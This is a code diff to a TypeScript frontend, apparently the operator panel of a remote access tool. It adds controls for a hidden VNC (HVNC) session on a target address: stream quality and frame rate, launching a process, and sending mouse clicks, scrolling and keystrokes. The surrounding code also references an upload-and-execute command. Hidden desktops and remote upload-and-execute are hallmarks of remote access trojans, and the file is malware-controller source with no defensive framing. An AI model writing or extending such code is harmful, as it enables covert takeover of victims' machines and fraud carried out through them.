@@ -276,9 +276,56 @@ export const sendMouseClickCmd = async (
 
 export const manageHVNC = async (
   addr: string | undefined,
-  run: string
+  run: string,
+  quality?: number,
+  fps?: number,
+  processPath?: string
 ): Promise<void> => {
-  return invoke("manage_hvnc", { addr, run });
+  return invoke("manage_hvnc", {
+    addr,
+    run,
+    quality,
+    fps,
+    processPath,
+  });
+};
+
+export const sendHVNCMouseClick = async (
+  addr: string | undefined,
+  x: number,
+  y: number,
+  clickType: number,
+  actionType: number,
+  scrollAmount: number
+): Promise<void> => {
+  return invoke("send_hvnc_mouse_click", {
+    addr,
+    x,
+    y,
+    clickType,
+    actionType,
+    scrollAmount,
+  });
+};
+
+export const sendHVNCKeyboardInput = async (
+  addr: string | undefined,
+  keyCode: number,
+  character: string,
+  isKeydown: boolean,
+  shiftPressed: boolean,
+  ctrlPressed: boolean,
+  capsLock: boolean
+): Promise<void> => {
+  return invoke("send_hvnc_keyboard_input", {
+    addr,
+    keyCode,
+    character,
+    isKeydown,
+    shiftPressed,
+    ctrlPressed,
+    capsLock,
+  });
 };
 
 export const uploadAndExecute = async (
